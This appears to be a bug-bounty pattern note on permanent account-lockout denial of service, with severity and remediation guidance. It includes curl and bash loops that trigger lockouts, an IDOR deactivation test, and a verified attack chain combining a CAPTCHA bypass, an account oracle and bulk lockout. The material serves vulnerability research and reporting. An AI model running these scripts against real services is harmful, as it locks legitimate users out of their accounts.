---
type: pattern
title: "Pattern - Permanent Account Deactivation DoS"
vuln_class: business-logic-dos
last_updated: 2026-06-03
tags:
  - bb-pattern
status: active
---

# Pattern: Permanent Account Deactivation DoS

> "No upper limit on lockout duration" + "No self-service unlock path" = this is not an anti-brute-force feature, this is a weapon in the attacker's hands. Irreversibility is a severity multiplier.

## Core Characteristics

All of the following conditions must be met for a high-severity report:

| Condition | Description |
|-----------|-------------|
| Low trigger threshold | Few failures (4-5 attempts) trigger lockout; or any unauthorized action can trigger it |
| Long / permanent lockout duration | >24h without automatic unlock, or requires administrator intervention |
| No self-service recovery mechanism | No "unlock via email" / no self-service unlock UI |
| Triggerable by unauthenticated attacker | Attacker does not need to hold the target account |
| Scalable | Combined with account enumeration, can destroy all accounts in bulk |

## Detection Signals

1. After several failed login attempts, account status changes (returns different code/message)
2. Attempting with the correct password also returns "account deactivated/locked"
3. T+24h probe shows account is still locked
4. Error message contains "please contact support/sales" rather than "try again in N minutes"
5. No unlock token is sent to the account email

## Test Methodology

### Step 1 -- Confirm baseline account status

```bash
# Verify target account is "exists and active" (-101 / 200 OK)
curl -s -X POST 'https://target/v1/token' \
  -H 'Content-Type: application/json' \
  -d '{"account":"target_account","password":"probe_$(date +%s)"}' | jq .
```

### Step 2 -- Trigger lockout (minimize damage principle)

**Only use 1 test account, do not batch test.**

```bash
# Consecutive N failed logins (start from N-1, observe if code changes)
for i in $(seq 1 5); do
  resp=$(curl -s -X POST 'https://target/v1/token' \
    -H 'Content-Type: application/json' \
    -d "{\"account\":\"test_account\",\"password\":\"wrong_${i}\"}")
  echo "[attempt $i] $(echo $resp | jq -r '.code // .error')"
  sleep 1
done
```

### Step 3 -- Confirm state transition

```bash
# Retry with a different password to confirm account has changed from "wrong password" to "account deactivated"
curl -s -X POST 'https://target/v1/token' \
  -H 'Content-Type: application/json' \
  -d '{"account":"test_account","password":"any_password"}' | jq .
# Expected: code = -999 / "account_locked" / "account_deactivated"
```

### Step 4 -- Persistence verification (key: establish "permanent" claim)

```bash
# T+24h probe (only 1 attempt per account, do not add to damage)
for t in "T+24h" "T+48h"; do
  echo "=== $t ==="
  curl -s -X POST 'https://target/v1/token' \
    -H 'Content-Type: application/json' \
    -d '{"account":"test_account","password":"probe"}' \
    | jq '{code: .code, message: .message}'
  read -p "Press enter after $t has elapsed..."
done
```

Persistence checkpoints: T+24h confirmed -> T+48h confirmed -> locked at every checkpoint -> "permanent" claim is established.

### Step 5 -- Scale impact estimation (theoretical, do not actually execute)

```bash
# Combined with account enumeration results, estimate attackable account count
# Only record the number of enumerated active accounts, do not actually trigger bulk lockout
echo "Enumerated active accounts: alice, karen, lily, tim, wayne (5 accounts)"
echo "Potential impact: all 5 accounts can be permanently deactivated by unauthenticated attacker"
```

## Real-world Example

### Enterprise Messaging App -- 4 failures cause permanent deactivation

- **Endpoint**: `POST https://bapi.target.example.com/v1/token`
- **Trigger threshold**: 4 consecutive login failures
- **State transition**: `-101` (active) -> `-999` (deactivated)
- **Persistence**: T+48h later 3/3 accounts still `-999`; vendor response: "please contact sales" = manual intervention
- **No self-service recovery**: No unlock email, no self-service UI, no timeout
- **Affected accounts**: 3 production accounts
- CVSS 7.5 (standalone) / **8.6 High** (chained with CAPTCHA bypass + oracle)

#### Attack Chain (fully verified)

```
Step 1 (CAPTCHA Bypass):
  GET /getcaptcha -> data_code field contains plaintext answer

Step 2 (Oracle):
  POST /v1/token -> -101 = account exists and active = attack target

Step 3 (Permanent DoS):
  Send 4 consecutive wrong passwords against the -101 account (auto-refetch CAPTCHA)
  -> Account changes to -999, still locked at T+48h

Step 4 (Scale -- theoretical):
  Repeat Step 3 for all enumerated -101 accounts
  -> Complete enterprise account destruction -> admin manual recovery is infeasible
  -> Medical communication disruption for healthcare customers
```

## Why High Severity (countering vendor "anti-brute-force feature" argument)

| Vendor Argument | Counter-argument |
|-----------------|-----------------|
| "4-failure lockout is anti-brute-force" | Industry standard (NIST SP 800-63B) recommends 5-30 minute timeout; permanent lockout does not comply |
| "This protects account security" | Attacker uses this feature to destroy accounts; protection becomes a weapon |
| "CAPTCHA prevents automation" | CAPTCHA is 100% bypassed, protection is ineffective |
| "Users can contact support to unlock" | Large-scale attack (100+ accounts) cannot be recovered quickly through manual channels |
| "Threshold of 4 is reasonable" | OWASP recommends minimum 5-10; normal use (typos) can also trigger at 4 |

## Variants

### Low-threshold Auto-lockout (CWE-307)

Login endpoint: N failures -> permanent lockout (N too small, typically <=5).
Most common form of this pattern.

### Unauthorized Deactivation Endpoint (CWE-285)

A `POST /admin/deactivate-user` or `PUT /account/status` endpoint exists where low-privilege / unauthenticated attackers can directly set another user's account to inactive.
Testing focus: IDOR + missing authz check.

```bash
# Test horizontal privilege escalation: modify another user's account ID
curl -s -X POST 'https://target/api/account/deactivate' \
  -H "Authorization: Bearer <your_token>" \
  -d '{"user_id": 12345}' | jq .
```

### SMS / OTP Lockout DoS

OTP sending has no rate limit; mass sending causes the account to enter a temporary lockout state (indirect DoS).
Or OTP failure count reaching the limit permanently locks the account.

### Race Condition Lockout

Concurrent requests race the account lockout counter, potentially triggering lockout prematurely (or bypassing lockout).

## Severity Guide

| Scenario | Severity | Explanation |
|----------|----------|-------------|
| Permanent lockout + unauthenticated trigger + batch feasible + critical business users | P1-P2 Critical/High | Full DoS attack chain established |
| Permanent lockout + unauthenticated trigger | P2 High | Even without batch, irreversibility supports High |
| Extended lockout (24h+) + no self-service recovery | P2-P3 | Must quantify recovery cost |
| Short lockout (<30min) + auto-unlock | P4 Low | Only minor inconvenience, normal anti-brute-force |
| Trigger requires authentication + only affects own account | Not valid | Cannot attack others |

**Irreversibility multiplier**: If the vendor can batch-restore with one click, reduce severity by one level; if manual one-by-one recovery is needed, maintain original rating.

## Persistence Claim Requirements

Reports must provide at least **2 time points** of persistence evidence to claim "permanent/extended" lockout:

| Minimum Required | Can Claim |
|-----------------|-----------|
| T+0h trigger confirmed | Lockout established |
| T+0h + T+24h | "No automatic unlock for over 24 hours" |
| T+0h + T+24h + T+48h | "Permanent lockout (no automatic unlock mechanism)" |

## Remediation Recommendations (for vendor report)

| Priority | Recommendation |
|----------|----------------|
| Urgent | Immediately manually restore already-locked production accounts |
| High | Change lockout timeout from "permanent" to temporary (15-30 minutes) |
| High | Provide self-service unlock mechanism (email confirmation link) |
| Medium | Increase trigger threshold (>=10 failures, OWASP standard) |
| Medium | Add IP-based rate limiting (separate from account lockout) |
| Low | Unify error messages (also fixes account enumeration oracle) |

## Cross-reference

- [[Pattern - Account Enumeration Oracle]] -- Oracle is a common upstream of this DoS pattern (first enumerate valid accounts, then batch lock them)
